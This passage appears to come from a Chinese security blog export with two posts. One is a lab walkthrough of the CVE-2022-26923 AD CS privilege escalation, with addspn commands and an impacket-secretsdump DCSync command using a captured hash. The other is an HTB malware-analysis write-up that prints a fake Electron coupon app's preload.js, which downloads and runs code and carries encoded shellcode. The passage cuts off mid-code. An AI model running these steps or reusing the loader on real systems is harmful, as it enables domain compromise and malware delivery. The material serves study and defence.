href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/3c154285-454c-4353-9a99-fb586e806944">3.1.1.5.1.3 Uniqueness Constraints</a>规定，我们的域内不能存在两个UPN相同的账户，我们可以新建一个用户并将其UPN更改为我们的robert用户的UPN，看看会发生什么</p><p>如下图所示，出现了域内一致UPN的冲突</p><p><img src="/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/微信截图_20250409180019.png" alt="微信截图_20250409180019"></p><p>我们接下来回到Machine证书模板，探究一下机器账户是如何进行身份验证的</p><p><img src="/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/微信截图_20250409180704.png" alt="微信截图_20250409180704"></p><p>我们可以看到标志位中存在<code>SubjectAltRequireDns</code>，在微软文档中记录为<a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/1192823c-d839-4bc3-9b6b-fa8c53507ae1">CT_FLAG_SUBJECT_ALT_REQUIRE_DNS</a>，此标志指示证书颁发机构CA将从请求者在AD中用户对象的DNS属性获得的值添加到颁发证书的SAN扩展中，我们将刚才申请机器账户证书的截图再拿出来一下</p><p><img src="/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/微信截图_20250408232307new.png" alt="微信截图_20250408232307new"></p><p>从上图我圈出的地方可以看到，CA通过DNS主机名对机器账户进行验证，我们在AD Explore中看一下这个属性在哪里被定义</p><p>如下图所示<code>dNSHostName</code>中对DNS主机名进行了定义</p><p><img src="/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/微信截图_20250409182726.png" alt="微信截图_20250409182726"></p><p>那么我们能否对其进行修改呢？这里我们需要查看一下<code>robertpc</code>的安全属性，同时<code>robertpc</code>这个机器账户是我们通过<code>robert</code>这个账户进行创建的，我们只观察<code>robert</code>拥有的权限</p><p><img src="/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/微信截图_20250409183220.png" alt="微信截图_20250409183220"></p><p>关于已验证的到DNS主机名的写入权限的详细解释在<a href="https://learn.microsoft.com/en-us/windows/win32/adschema/r-validated-dns-host-name">Validated-DNS-Host-Name validated writes</a>，简单来说这个权限允许设置与计算机名和域名一致的<code>dNSHostName</code> 属性，似乎有点难以理解，我们接着做一个实验，我们尝试修改<code>dNSHostName</code>为<code>mytest.chromos2me.com</code>看看会发生什么</p><p><img src="/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/微信截图_20250409184524.png" alt="微信截图_20250409184524"></p><p><img src="/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/微信截图_20250409184544.png" alt="微信截图_20250409184544"></p><p>如上图所示被成功修改，同时注意到<code>sAMAccountName</code>并未被修改</p><p><img src="/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/微信截图_20250409184619.png" alt="微信截图_20250409184619"></p><blockquote><p>这里的与计算机名和域名一致的<code>dNSHostName</code> 属性实际上只要我们设置的合理一般都不会出现非法写入</p></blockquote><p>现在能否能利用机器账户进行证书的请求？试试就知道了</p><p><img src="/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/微信截图_20250409185008.png" alt="微信截图_20250409185008"></p><p>很明显我们成功利用新的DNS主机名标识了我们的机器同时进行了证书的申请，这里我们可以进行一个思考，我们在上文提到的Uniqueness Constraints唯一性约束文档中并未提到机器账户的dNSHostName必须唯一，那么能否修改dNSHostName为和域控一样，那么我们是不是就能利用域控身份进行高权限证书的请求呢？</p><p>这里因为impacket下的addcomputer在使用默认的SAMR方法创建机器账户时不会包含SPN属性，同时因为我自己的环境问题无法换用LDAPS方法，这里我们就手动的利用<a href="https://github.com/dirkjanm/krbrelayx">krbrelayx</a>中的addspn这个工具进行添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 addspn.py -u chromos2me.com\\robertpc\$ -p Passw0rd -s HOST/robertpc.chromos2me.com 192.168.103.201</span><br></pre></td></tr></table></figure><p><img src="/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/微信截图_20250410133430.png" alt="微信截图_20250410133430"></p><p>查询一下SPN</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 addspn.py -u chromos2me.com\\robertpc\$ -p Passw0rd 192.168.103.201 -q</span><br></pre></td></tr></table></figure><p><img src="/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/微信截图_20250410133523.png" alt="微信截图_20250410133523"></p><p>根据<a href="https://learn.microsoft.com/zh-cn/windows-server/identity/ad-ds/manage/how-to-configure-spn?tabs=add%2Caduc">How to configure SPN</a>微软官方文档所指出的SPN格式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TERMSRV/WSRV2022</span><br><span class="line">TERMSRV/WSRV2022.contoso1.com</span><br></pre></td></tr></table></figure><p>我们为了复现漏洞环境在域控上添加一条关于主机名的SPN</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HOST/robertpc</span><br><span class="line">RestrictedKrbHost/robertpc</span><br><span class="line">RestrictedKrbHost/robertpc.chromos2me.com</span><br></pre></td></tr></table></figure><blockquote><p>实际上在我们刚才使用<code>addspn</code>添加SPN时工具自动创建的SPN格式为</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;KrbRestrictedHost/hostname</span><br><span class="line">&gt;KrbRestrictedHost/hostname.domain<span class="emphasis">_fqdn</span></span><br><span class="line"><span class="emphasis">&gt;Host/hostname</span></span><br><span class="line"><span class="emphasis">&gt;Host/hostname.domain_</span>fqdn</span><br></pre></td></tr></table></figure><p>但是似乎环境存在问题，所以尝试手动复现一下环境，这里可以参考<code>impacket-addcomputer</code>中关于创建SPN的代码添加</p><p><img src="/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/微信截图_20250410134717.png" alt="微信截图_20250410134717"></p></blockquote><p><img src="/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/微信截图_20250410134916.png" alt="微信截图_20250410134916"></p><p>在域控组织单元中找到<code>DC$</code>的<code>dNSHostName</code></p><p><img src="/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/微信截图_20250409185522.png" alt="微信截图_20250409185522"></p><p>对<code>robertpc$</code>的<code>dNSHostName</code>修改为域控的<code>dNSHostName</code>看看会发生什么</p><p><img src="/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/微信截图_20250410154902.png" alt="微信截图_20250410154902"></p><p>点击OK后出现了操作错误</p><p><img src="/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/微信截图_20250410155052.png" alt="微信截图_20250410155052"></p><p>为了追究其原因我们尝试将DNS主机名修改为DC之外的主机名，然后观察一下SPN的变化</p><p><img src="/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/微信截图_20250410155520.png" alt="微信截图_20250410155520"></p><p><img src="/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/微信截图_20250410155551.png" alt="微信截图_20250410155551"></p><p>由上图发现，<code>dNSHostName</code>发生变化时，SPN中与FQDN完整限定域名有关的项均发生了改变，可以想象到，当我们将创建的机器账户<code>robertpc$</code> 的<code>dNSHostName</code>更改为<code>DC.chromos2me.com</code>时其SPN会变为<code>RestrictedKrbHost/DC.chromos2me.com</code> 和 <code>HOST/DC.chromos2me.com</code>，这样就会与域控的SPN发生唯一性约束冲突，我们可以看一下域控的SPN属性</p><p><img src="/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/微信截图_20250410162256.png" alt="微信截图_20250410162256"></p><p>到现在为止，我们已经确定了操作错误产生的原因，那么这里的多个SPN属性我们是否能够控制，还是说我们已经没有办法实现DNS主机名的更改了呢，我们看一下<code>robert</code>用户对<code>robertpc$</code>的ACL</p><p><img src="/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/微信截图_20250410163153.png" alt="微信截图_20250410163153"></p><p><a href="https://learn.microsoft.com/en-us/windows/win32/adschema/r-validated-spn">Validated-SPN validated writes</a>这个权限描述为用于设置符合计算机DNS主机名的SPN属性，和上面的已验证的到DNS主机名的写入权限类似，我们的<code>servicePrincipalName</code>更新的值也必须符合 <code>dNSHostName</code> 属性，刚才我们注意到我们的四个SPN中只有两个发生了改变，另外两个中并没有包含 <code>dNSHostName</code> ，是不是我们将会发生改变的两个SPN删去后就可以正常进行 <code>dNSHostName</code> 的伪造了？</p><p>删去两个变化的SPN</p><p><img src="/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/微信截图_20250410163811.png" alt="微信截图_20250410163811"></p><p>修改DNS主机名</p><p><img src="/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/微信截图_20250410163913.png" alt="微信截图_20250410163913"></p><p>我们尝试利用<code>Machine</code>模板申请证书，如下图成功申请</p><p><img src="/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/微信截图_20250410164211.png" alt="微信截图_20250410164211"></p><p>继续尝试看其能否利用DC进行身份验证，成功</p><p><img src="/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/微信截图_20250410164411.png" alt="微信截图_20250410164411"></p><p>接下来利用DC哈希执行DCSync攻击转储域控上存储的所有用户哈希</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump <span class="string">&#x27;chromos2me.com/dc$@dc.chromos2me.com&#x27;</span> -hashes aad3b435b51404eeaad3b435b51404ee:a9edd7fbef42767175d43643ae7fcfc7 -target-ip 192.168.103.201</span><br></pre></td></tr></table></figure><p><img src="/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/微信截图_20250410165324.png" alt="微信截图_20250410165324"></p><h2 id="证书映射过程"><a href="#证书映射过程" class="headerlink" title="证书映射过程"></a>证书映射过程</h2><p>在Oliver Lyak的文章中还提到了在身份验证期间证书如何映射到帐户的技术细节，在此也简单的说一说</p><p>首先根据在AS-REQ中指出的形如<code>user@chromos2me.com</code>的主体名称查找对应的用户，Key Distribution Center（KDC）接着根据账户的userAccountControl 属性，选择不同的映射方式，这里的userAccountControl在我们刚才的机器账户上为4096也就是0x1000，对应<code>WORKSTATION_TRUST_ACCOUNT</code>即计算机账户，另外域控制器账户的掩码值为0x2000对应<code>SERVER_TRUST_ACCOUNT</code>，普通用户账户的掩码值为0x0400对应<code>NORMAL_ACCOUNT</code>，根据不同的账户KDC会通过证书中的SAN字段中的 DNSName 或 UPNName 来验证证书映射，对于上面的三种用户，除了普通账户使用UPNName 字段进行验证外，其他均使用DNSName 字段进行验证</p><p>来自<a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pkca/4ab93c65-0e57-4370-9d63-b90521041892">3.1.5.2.1.1 SAN DNSName field</a>的微软文档指出<strong>KDC 必须确认找到的账户名称与证书中 DNSName 字段中的计算机名（以 $ 结尾）匹配，并且证书中 DNSName 字段中的 DNS 域名与 realm 的 DNS 域名匹配</strong></p><p>就拿我们做实验的例子来说，我们的计算机账户<code>robertpc$</code>，它属于<code>chromos2me.com</code>，我们为了实现有效的映射，证书中的DNSName应为<code>robertpc.chromos2me.com</code>，即格式为&lt;计算机名&gt;.&lt;域名&gt;，同时这里的 &lt;计算机名&gt; 是sAMAccountName去掉结尾$后的内容</p><p>因此，在 PKINIT Kerberos认证过程中，我们提供的主体名称是类似 <code>robertpc$@chromos2me.com</code> 的格式，并提供一个 DNSName 设置为 <code>robertpc.chromos2me.com</code> 的证书。KDC 会根据主体名称查找对应账户。由于 <code>robertpc$</code> 是一个计算机账户，KDC 会将 DNSName 字段分为计算机名部分和域部分。然后 KDC 会验证计算机名部分是否与 sAMAccountName 加上 $ 后一致，并验证域名部分是否与域名匹配。如果两个部分都匹配，验证就成功了，映射也就成立。<strong>值得注意的是，账户的 dNSHostName 属性并不会用于证书映射，该属性仅在申请证书时使用。</strong></p><h2 id="修补"><a href="#修补" class="headerlink" title="修补"></a>修补</h2><p>该漏洞已通过 Microsoft 2022 年 5 月的安全更新修复，在证书中引入了一个新的对象标识符，通过将用户的SID嵌入到新的 szOID_NTDS_CA_SECURITY_EXT（1.3.6.1.4.1.311.25.2）OID 中，但是具有新<code>CT_FLAG_NO_SECURITY_EXTENSION（0x80000）</code>标志的证书模板将不会嵌入新<code>szOID_NTDS_CA_SECURITY_EXT OID</code>，因此这些模板仍然容易受到此攻击，虽然这种标志设置的可能性不大。</p>]]></content>
      
      
      <categories>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ADCS </tag>
            
            <tag> 域内提权 </tag>
            
            <tag> Windows域安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-OpSalwarKameez24-1 Super-Star</title>
      <link href="/2025/03/08/OpSalwarKameez24-1/"/>
      <url>/2025/03/08/OpSalwarKameez24-1/</url>
      
        <content type="html"><![CDATA[<h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">StoreD Technologies&#x27; customer support team operates tirelessly around the clock in 24/7 shifts to meet customer needs. During the Diwali season, employees have been receiving genuine discount coupons as part of the celebrations. However, this also presented an opportunity for a threat actor to distribute fake discount coupons via email to infiltrate the organization&#x27;s network. One of the employees received a suspicious email, triggering alerts for enumeration activities following a potential compromise. The malicious activity was traced back to an unusual process. The Incident Response Team has extracted the malicious binaries and forwarded them to the reverse engineering team for further analysis. This is a warning that this Sherlock includes software that is going to interact with your computer and files. This software has been intentionally included for educational purposes and is NOT intended to be executed or used otherwise. Always handle such files in isolated, controlled, and secure environments. One the Sherlock zip has been unzipped, you will find a DANGER.txt file. Please read this to proceed.</span><br></pre></td></tr></table></figure><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> What is the process name of malicious NodeJS application?</span><br><span class="line"></span><br><span class="line"><span class="bullet">2.</span> Which option has the attacker enabled in the script to run the malicious Node.js application?</span><br><span class="line"></span><br><span class="line"><span class="bullet">3.</span> What protocol and port number is the attacker using to transmit the victim&#x27;s keystrokes?</span><br><span class="line"></span><br><span class="line"><span class="bullet">4.</span> What XOR key is the attacker using to decode the encoded shellcode?</span><br><span class="line"></span><br><span class="line"><span class="bullet">5.</span> What is the IP address, port number and process name encoded in the attacker payload ?</span><br><span class="line"></span><br><span class="line"><span class="bullet">6.</span> What are the two commands the attacker executed after gaining the reverse shell?</span><br><span class="line"></span><br><span class="line"><span class="bullet">7.</span> Which Node.js module and its associated function is the attacker using to execute the shellcode within V8 Virtual Machine contexts?</span><br><span class="line"></span><br><span class="line"><span class="bullet">8.</span> Decompile the bytecode file included in the package and identify the Win32 API used to execute the shellcode.</span><br></pre></td></tr></table></figure><p>在虚拟机中解压附件，得到<code>Electron-Coupon</code>（这里的翻译为电子优惠卷）可执行程序和<code>opsk1.pcap</code>这个流量包，我们根据题目背景可以推断出攻击者的攻击路径为利用虚假的电子优惠卷exe进行钓鱼，之后进行后渗透利用</p><p>根据恶意可执行文件的名称，我们可以猜测它是使用<code>Electron</code>框架进行构建的</p><blockquote><p>Electron是一个用于构建跨平台桌面应用程序的开源框架，它基于Chromium（浏览器内核）和Node.js（后端运行时），允许开发者使用HTML、CSS 和 JavaScript来创建桌面应用。</p></blockquote><p>我们循着这个思路可以猜测攻击者利用<code>Electron-builder</code>里的打包工具对载荷进行打包，我们之后需要对<code>Electron-Coupon</code>进行解包</p><blockquote><p><strong>关于如何识别Electron打包程序</strong></p><p>将exe后缀改为zip，然后尝试利用解压缩文件打开，然后观察压缩文件中是不是存在resources目录，目录下有一个app.asar文件，满足这些条件说明这是一个Electron打包程序</p><p>利用<a href="https://github.com/electron/asar/这个工具解包，需要配置npm环境">https://github.com/electron/asar/这个工具解包，需要配置npm环境</a></p></blockquote><p>观察zip中存在可执行程序，我们直接解压提取出来exe和dll</p><p><img src="/2025/03/08/OpSalwarKameez24-1/微信截图_20250307180345.png" alt="微信截图_20250307180345"></p><p>很明显恶意行为的产生是来自程序<code>Coupon.exe</code></p><p>之后我们在<code>resources</code>目录下找到<code>app.asar</code>，我们利用上面提到的工具进行解包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asar e Electron-Coupon.exe ./unpacked</span><br></pre></td></tr></table></figure><p><img src="/2025/03/08/OpSalwarKameez24-1/微信截图_20250307183600.png" alt="微信截图_20250307183600"></p><blockquote><p><code>asar</code>文件结构中重要的部分解释如下：</p><p><code>package.json</code>：Electron应用的配置文件，包含应用名称、入口文件、依赖项、脚本等信息。</p><p><code>extraResources</code>：存放外部资源（不会被打包进 <code>app.asar</code>），例如额外的配置文件（<code>.json</code>、<code>.yaml</code>），图片、音频、视频等媒体文件等，存放 <code>preload.js</code> 预加载脚本，存放第三方二进制文件（如 Python、Go、Rust 生成的可执行文件）</p><p><code>node_modules</code>：是Node.js项目中用于存放所有安装的依赖包的文件夹，所有的第三方库都会被下载到 <code>node_modules</code> 目录中</p><p><code>public</code>：通常用于存放 <strong>静态资源</strong>，例如 HTML、CSS、JavaScript 文件，以及图片、字体等</p></blockquote><p>这个打包文件的配置文件如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Coupon&quot;</span>,</span><br><span class="line">  <span class="string">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">  <span class="string">&quot;description&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="string">&quot;main&quot;</span>: <span class="string">&quot;index.js&quot;</span>,</span><br><span class="line">  <span class="string">&quot;author&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="string">&quot;license&quot;</span>: <span class="string">&quot;ISC&quot;</span>,</span><br><span class="line">  <span class="string">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;bytenode&quot;</span>: <span class="string">&quot;^1.5.6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ffi-napi&quot;</span>: <span class="string">&quot;^4.0.3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ref-napi&quot;</span>: <span class="string">&quot;^3.0.3&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;postinstall&quot;</span>: <span class="string">&quot;electron-builder install-app-deps&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在<code>index.js</code>下找到项目入口文件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; app, <span class="title class_">BrowserWindow</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;electron&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> mainWindow = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">//const powershell = fs.readFileSync(`C:\\Users\\Public\\test.txt`, &#x27;utf8&#x27;, data =&gt; data);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createWindow</span>(<span class="params"></span>) &#123;</span><br><span class="line">    mainWindow = <span class="keyword">new</span> <span class="title class_">BrowserWindow</span>(&#123; <span class="attr">width</span>: <span class="number">800</span>, <span class="attr">height</span>: <span class="number">600</span>,</span><br><span class="line">  <span class="attr">webPreferences</span>: &#123;</span><br><span class="line"><span class="attr">contextIsolation</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="attr">nodeIntegration</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="attr">nodeIntegrationInWorker</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="attr">preload</span>: path.<span class="title function_">resolve</span>(<span class="string">`<span class="subst">$&#123;process.resourcesPath&#125;</span>/../extraResources/preload.js`</span>)</span><br><span class="line">&#125;&#125;);</span><br><span class="line">    mainWindow.<span class="title function_">loadFile</span>(<span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/public/testPage.html`</span>);</span><br><span class="line">    mainWindow.<span class="title function_">on</span>(<span class="string">&#x27;closed&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        mainWindow = <span class="literal">null</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//path.resolve(`$&#123;__dirname&#125;/preload.js`)</span></span><br><span class="line"><span class="comment">//fork(powershell);</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">on</span>(<span class="string">&#x27;ready&#x27;</span>, createWindow);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">on</span>(<span class="string">&#x27;window-all-closed&#x27;</span>, <span class="function">() =&gt;</span> process.<span class="property">platform</span> !== <span class="string">&#x27;darwin&#x27;</span> &amp;&amp; app.<span class="title function_">quit</span>());</span><br><span class="line"><span class="comment">// re-create a window on mac</span></span><br><span class="line">app.<span class="title function_">on</span>(<span class="string">&#x27;activate&#x27;</span>, <span class="function">() =&gt;</span> mainWindow === <span class="literal">null</span> &amp;&amp; <span class="title function_">createWindow</span>());</span><br></pre></td></tr></table></figure><blockquote><p>上面的代码主要用于创建一个窗口，但是里面隐藏了用于RCE的不安全配置</p><p><code>contextIsolation: false</code>：关闭上下文隔离，会让 <code>preload</code> 脚本和 <code>web</code> 页面运行在相同的 JavaScript 作用域中从而可以直接修改 <code>window</code> 对象</p><p><code>nodeIntegration: true</code>：允许 <code>Electron</code> 的渲染进程直接使用 <code>Node.js</code> API，这意味着网页中的 JavaScript 代码可以访问 Node.js 模块，具有极高的权限，会导致RCE</p><p><code>nodeIntegrationInWorker: true</code>：允许 <code>Web Workers</code>（网页工作线程）中也能使用 <code>Node.js</code> API</p><p><code>preload: path.resolve()</code>：在网页加载前执行的预加载脚本</p></blockquote><p>下面是<code>preload.js</code> 脚本</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typeof</span> <span class="built_in">require</span> === <span class="string">&#x27;function&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">runShell</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> options = &#123;</span><br><span class="line">  <span class="attr">host</span>: <span class="string">&#x27;0.0.0.0&#x27;</span>,</span><br><span class="line">  <span class="attr">port</span>: <span class="number">80</span>,</span><br><span class="line">  <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">http.<span class="title function_">get</span>(options, <span class="keyword">function</span>(<span class="params">res</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> body = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  res.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="keyword">function</span>(<span class="params">chunk</span>) &#123;</span><br><span class="line">    body += chunk;</span><br><span class="line">  &#125;);</span><br><span class="line">  res.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b64string = <span class="string">&quot;xHiVWo9qiVuCNslP4RTAFMw+llWePo5RmD7dFJ57kUGFbIUcznCFQM43zDnmPsAUzD7AFMx9kBTRPpJRnWuJRok2wleEd4xQs26SW497k0fON8w55j7AFMw+wBTMbYgU0T6DRMJtkFWbcMgWj3OEGolmhRbAPrtpxSXtPsw+wBSaf5IUj3KJUYJqwAnMcIVDzHCFQMJNj1eHe5QcxSXtPsw+wBSPcolRgmrOV4NwjlGPasgA2CrUGMw80QHCLNACwi/TGt8vwhjMeJVaj2qJW4I2yU/hFMAUzD7AFMw+g1iFe45Awm6JRIk2k1zCbZRQhXDJD+EUwBTMPsAUzD6TXMJtlFCDa5QanHeQUcR9jF2JcJQd1xPqFMw+wBTMPsBHhDCTQIh7kkbCbolEiTaDWIV7jkDFJe0+zD7AFJE32znmPsAUzGyFQJlsjhTDf88PzDHPFLxshUKJcJRHzGqIUcxQj1CJMIpHzH+QRIB3g1WYd49azHiPRoE+g0aNbYhdgnntPpE3yB3X&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span 